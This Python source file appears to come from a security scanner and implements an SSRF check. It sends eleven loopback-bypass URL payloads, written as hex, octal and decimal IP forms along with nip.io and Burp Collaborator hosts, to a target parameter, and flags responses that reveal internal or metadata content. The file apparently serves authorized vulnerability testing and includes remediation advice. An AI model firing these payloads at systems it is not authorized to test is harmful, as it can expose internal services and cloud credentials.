"""Server-Side Request Forgery (SSRF) scanner with 11 IP bypass techniques."""
from __future__ import annotations

import hashlib
from typing import Any, Dict, List

from bugwolf.scanners import Scanner
from bugwolf.scanners.live_finding import LiveFinding


SCHEMA = "bugwolf-scanner-v1"


SSRF_PAYLOADS = (
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0x7f000001",
    "http://2130706433",
    "http://0177.0.0.1",
    "http://127.1",
    "http://0",
    "http://localhost",
    "http://127.0.0.1.nip.io",
    "http://spoofed.burpcollaborator.net",
)


def _pid(payload: str) -> str:
    return "ssrf-" + hashlib.sha256(payload.encode()).hexdigest()[:10]


class SSRFScanner(Scanner):
    name = "ssrf"
    description = "Server-side request forgery via 11 IP bypass techniques"
    bug_class = "ssrf"
    default_severity = "high"

    PAYLOADS = SSRF_PAYLOADS

    def matches(self, target: Dict[str, Any]) -> bool:
        return "url" in target

    def scan(self, target: Dict[str, Any], transport) -> List[LiveFinding]:
        findings: List[LiveFinding] = []
        url = target.get("url", "")
        method = str(target.get("method", "POST")).upper()
        param = target.get("param", "url")
        for payload in SSRF_PAYLOADS:
            try:
                resp = transport(method, url,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"},
                                 body=f"{param}={payload}")
            except Exception:
                continue
            rbody = (resp.get("body") or "") if isinstance(resp, dict) else ""
            rheaders = (resp.get("headers") or {}) if isinstance(resp, dict) else {}
            blob = rbody + "\n" + "\n".join(f"{k}: {v}" for k, v in rheaders.items())
            indicators = ("loopback", "internal", "169.254.169.254", "metadata",
                          "127.0.0.1", "localhost", payload.split("://", 1)[-1])
            if any(ind in blob for ind in indicators):
                findings.append(LiveFinding(
                    scanner=self.name,
                    bug_class=self.bug_class,
                    severity=self.default_severity,
                    endpoint=url,
                    method=method,
                    evidence=f"SSRF payload reflected or fetched: {payload[:64]}",
                    reproducer=f"{method} {url}  body={param}={payload}",
                    remediation="Block private/loopback ranges at the egress; resolve hostnames yourself; deny non-http(s) schemes.",
                    payload_id=_pid(payload),
                    extra={"status": resp.get("status")},
                ))
        return findings


__all__ = ["SSRFScanner", "SSRF_PAYLOADS"]
